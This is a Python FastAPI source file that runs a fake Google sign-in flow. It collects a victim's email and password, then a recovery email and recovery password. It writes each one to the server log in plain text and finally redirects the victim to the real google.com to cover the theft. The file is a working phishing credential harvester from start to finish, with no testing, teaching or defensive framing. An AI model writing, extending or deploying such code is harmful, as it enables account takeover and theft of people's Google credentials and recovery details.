from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
import logging
import uvicorn

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.get("/", response_class=HTMLResponse)
async def google_login(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@app.post("/check-email")
async def check_email(request: Request, email: str = Form(...)):
    logger.info(f"Email: {email}")
    response = RedirectResponse(url="/password", status_code=303)
    response.set_cookie(key="user_email", value=email)
    return response

@app.get("/password", response_class=HTMLResponse)
async def password_page(request: Request):
    email = request.cookies.get("user_email", "usuario@gmail.com")
    return templates.TemplateResponse("password.html", {
        "request": request,
        "email": email
    })

@app.post("/check-password")
async def check_password(request: Request, password: str = Form(...)):
    email = request.cookies.get("user_email", "usuario@gmail.com")
    logger.info(f"Password for {email}: {password}")
    return RedirectResponse(url="/recovery", status_code=303)

@app.get("/recovery", response_class=HTMLResponse)
async def recovery_page(request: Request):
    return templates.TemplateResponse("recovery.html", {"request": request})

@app.post("/process-recovery")
async def process_recovery(request: Request, recovery_email: str = Form(...), recovery_password: str = Form(...)):
    main_email = request.cookies.get("user_email", "Desconocido")
    logger.info(f"Recovery data - Main: {main_email}, Recovery Email: {recovery_email}, Recovery Password: {recovery_password}")
    response = RedirectResponse(url="https://www.google.com", status_code=307)
    response.delete_cookie(key="user_email")
    return response

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
